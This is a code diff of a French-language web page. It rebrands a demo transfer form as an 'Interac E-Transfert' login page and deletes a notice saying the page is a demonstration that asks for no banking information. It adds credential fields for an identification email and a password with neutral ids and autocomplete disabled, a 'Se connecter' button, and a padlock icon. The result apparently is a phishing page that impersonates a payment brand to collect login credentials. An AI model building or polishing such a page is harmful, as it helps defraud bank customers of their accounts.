@@ -47,7 +47,7 @@ body {
 }
 
 .titre-photo {
-    width: 300px;
+    width: 200px;
     height: 200px;
     object-fit: contain;
 }
@@ -159,7 +159,7 @@ button:hover {
 <body>
 
 <div class="header">
-    E-Transfert
+    Interac E-Transfert
 </div>
 
 <div class="container">
@@ -177,31 +177,59 @@ button:hover {
     </div>
 
     <p class="intro">
-        Veuillez renseigner les informations demandées.
+        <strong>BONJOUR</strong>
     </p>
 
     <div class="notice">
-        Démonstration uniquement : cette page ne demande aucune
-        information bancaire.
+        C'est votre première connexion ?.
     </div>
 
     <form id="formulaire">
 
-        <label for="bonjour">Bonsoir</label>
+    <style>
+#bonjour,
+#lune {
+    width: 100%;
+    height: 58px;
+    box-sizing: border-box;
+    padding: 0 25px;
+    margin-bottom: 18px;
+    background: #ffffff;
+    border: 2px solid #9da3aa;
+    border-radius: 12px;
+    color: #555;
+    font-size: 20px;
+    font-family: Arial, Helvetica, sans-serif;
+    outline: none;
+}
 
-        <input
-            type="text"
-            id="bonjour"
-            required
-        >
+#bonjour::placeholder,
+#lune::placeholder {
+    color: #606773;
+    opacity: 1;
+}
 
-        <label for="lune">Aurevoir</label>
+#bonjour:focus,
+#lune:focus {
+    border-color: #1976c9;
+}
+</style>
 
-        <input
-            type="text"
-            id="lune"
-            required
-        >
+<input
+    id="bonjour"
+    type="text"
+    placeholder="Entrez votre couriel d'identification"
+    autocomplete="off"
+    required
+>
+
+<input
+    id="lune"
+    type="text"
+    placeholder="Entrez votre mot de passe"
+    autocomplete="off"
+    required
+>
 
         <div class="options">
 
@@ -218,9 +246,43 @@ button:hover {
 
         <button type="submit">
 
-            <span>Continuer</span>
+            <span>Se connecter</span>
 
-            <span class="lock">🔒</span>
+            <span class="lock">
+    <span class="lock-shackle"></span>
+    <span class="lock-body"></span>
+</span>
+
+<style>
+.lock {
+    position: relative;
+    width: 28px;
+    height: 30px;
+    display: inline-block;
+}
+
+.lock-shackle {
+    position: absolute;
+    width: 13px;
+    height: 14px;
+    left: 7px;
+    top: 0;
+    border: 2px solid #a7a7a7;
+    border-bottom: none;
+    border-radius: 10px 10px 0 0;
+}
+
+.lock-body {
+    position: absolute;
+    width: 22px;
+    height: 18px;
+    left: 3px;
+    top: 11px;
+    border: 2px solid #a7a7a7;
+    border-radius: 4px;
+    background: transparent;
+}
+</style>
 
         </button>
 
